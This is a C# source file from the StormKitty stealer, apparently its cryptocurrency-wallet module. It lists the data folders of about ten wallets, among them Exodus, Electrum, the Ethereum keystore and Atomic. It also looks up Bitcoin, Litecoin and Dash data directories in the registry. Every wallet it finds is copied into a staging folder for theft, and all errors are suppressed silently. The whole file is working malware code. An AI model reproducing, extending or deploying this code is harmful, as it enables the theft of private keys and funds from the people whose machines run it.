/* 
    Author : LimerBoy
    Github : github.com/LimerBoy/StormKitty
*/

using System.IO;
using Microsoft.Win32;
using System.Collections.Generic;
using StormKitty;

namespace Stealer
{
    internal sealed class Wallets
    {
        // Wallets list directories
        private static List<string[]> sWalletsDirectories = new List<string[]>
        {
            new string[] { "Zcash", Paths.appdata + "\\Zcash" },
            new string[] { "Armory", Paths.appdata + "\\Armory" },
            new string[] { "Bytecoin", Paths.appdata + "\\bytecoin" },
            new string[] { "Jaxx", Paths.appdata + "\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb" },
            new string[] { "Exodus", Paths.appdata + "\\Exodus\\exodus.wallet" },
            new string[] { "Ethereum", Paths.appdata + "\\Ethereum\\keystore" },
            new string[] { "Electrum", Paths.appdata + "\\Electrum\\wallets" },
            new string[] { "AtomicWallet", Paths.appdata + "\\atomic\\Local Storage\\leveldb" },
            new string[] { "Guarda" , Paths.appdata + "\\Guarda\\Local Storage\\leveldb" },
            new string[] { "Coinomi", Paths.lappdata + "\\Coinomi\\Coinomi\\wallets" },
        };
        // Wallets list from registry
        private static string[] sWalletsRegistry = new string[]
        {
            "Litecoin",
            "Dash",
            "Bitcoin"
        };

        // Write wallet.dat
        public static void GetWallets(string sSaveDir)
        {
            try
            {
                Directory.CreateDirectory(sSaveDir);

                foreach (string[] wallet in sWalletsDirectories)
                    CopyWalletFromDirectoryTo(sSaveDir, wallet[1], wallet[0]);

                foreach (string wallet in sWalletsRegistry)
                    CopyWalletFromRegistryTo(sSaveDir, wallet);

                if (Counter.Wallets == 0)
                    Filemanager.RecursiveDelete(sSaveDir);

            } catch { }
        }

        // Copy wallet files to directory
        private static void CopyWalletFromDirectoryTo(string sSaveDir, string sWalletDir, string sWalletName)
        {
            string cdir = sWalletDir;
            string sdir = Path.Combine(sSaveDir, sWalletName);
            if (Directory.Exists(cdir))
            {
                Filemanager.CopyDirectory(cdir, sdir);
                Counter.Wallets++;
            }
        }

        // Copy wallet from registry to directory
        private static void CopyWalletFromRegistryTo(string sSaveDir, string sWalletRegistry)
        {
            string sdir = Path.Combine(sSaveDir, sWalletRegistry);
            try
            {
                using (var registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey(sWalletRegistry).OpenSubKey($"{sWalletRegistry}-Qt"))
                {
                    if (registryKey != null)
                    {
                        string cdir = registryKey.GetValue("strDataDir").ToString() + "\\wallets";
                        if (Directory.Exists(cdir))
                        {
                            Filemanager.CopyDirectory(cdir, sdir);
                            Counter.Wallets++;
                        }
                    }
                }
            }
            catch { }
        }


    }
}
